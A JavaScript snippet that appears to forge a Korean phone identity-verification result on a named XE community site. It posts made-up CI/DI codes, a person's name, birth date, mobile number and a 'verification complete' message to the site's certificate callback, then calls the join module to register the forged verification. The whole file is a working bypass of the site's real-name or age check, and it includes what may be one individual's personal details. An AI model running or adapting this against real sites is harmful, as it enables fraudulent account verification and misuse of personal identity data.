const myHeaders = new Headers()
const di = 'MC0aGCCqGSdsIb4DQIcJryCAog7oNcoUbVf4tposGr4ccUCNevbm2tVEb%2Bz32urgEAaHxw%3D'
const ci = 'uUag1zd0md4dd44xIdvFfcdfUFBLaGvXdHVG6hxu3zrsKSRgKcuR7WCWpPNJH4PD1qCXBamz5ZWmGYwCE8QzBblv%2F%2F%2FTS%3D%3D'
const name = '김혁수'
const birthday = '19980303'
const cel = '01104020415'
const sex = '1'

myHeaders.append("Content-Type", "application/x-www-form-urlencoded");
const urlencoded = new URLSearchParams();
urlencoded.append("idcf_mbr_com_cd", "P21050000000");
urlencoded.append("hs_cert_svc_tx_seqno", "20250121221017");
urlencoded.append("hs_cert_msr_cd", "10");
urlencoded.append("hs_cert_rqst_caus_cd", "");
urlencoded.append("result_cd", "B000");
urlencoded.append("result_msg", "%BA%BB%C0%CE%C0%CE%C1%F5+%BF%CF%B7%E1");
urlencoded.append("result_di", di);
urlencoded.append("result_ci", ci);
urlencoded.append("result_name", name);
urlencoded.append("result_birthday", birthday);
urlencoded.append("result_sex", sex);
urlencoded.append("result_foreign", "1");
urlencoded.append("result_cellcompany", "03");
urlencoded.append("result_cel", cel);

var requestOptions = {
    method: 'POST',
    headers: myHeaders,
    body: urlencoded,
    redirect: 'follow'
};

fetch("https://aragonk.com/xe/modules/join_extend/skins/default_okname/safe_hs_cert4.php", requestOptions)
    .then(response => {
        response.text()
        var param = {
            name: name,
            di: di,
            birthday: birthday,
            age: 26,
            sex: sex,
            cellcompany: 3,
            cell: cel,
            type: 'self'
        }
        exec_xml('join_extend', 'procJoin_extendAgree', param, function() {
            location.reload()
        });

    })
    .catch(error => console.log('error', error));